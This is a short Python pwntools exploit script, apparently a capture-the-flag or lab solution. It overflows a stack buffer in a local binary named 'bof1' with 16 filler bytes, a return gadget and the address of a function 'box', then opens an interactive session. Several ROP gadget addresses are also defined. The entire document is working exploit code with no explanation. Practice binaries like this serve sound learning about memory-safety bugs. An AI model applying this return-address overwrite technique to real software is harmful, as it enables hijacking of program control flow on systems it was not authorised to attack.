from pwn import *

# context.log_level = 'debug'
context.arch='amd64'
# context(terminal = ['zsh'])
pop_rbp_ret=0x0000000000028a91
push_rbp_ret=0x000000000004422a
pop_rsp_ret=0x000000000003c068
push_rsp_ret=0x00000000000385de
pop_rdi_ret=0x0000000000158748
ret=0x000000000040101a
# pop_nop_ret=0x0000000000110950
e=ELF("./bof1")
p=process("./bof1")

payload=b'A'*16
payload += p64(0x000000000040101a)
payload += p64(e.symbols['box'])


print(payload)
# pause()
p.sendlineafter(b'>',payload)
p.interactive()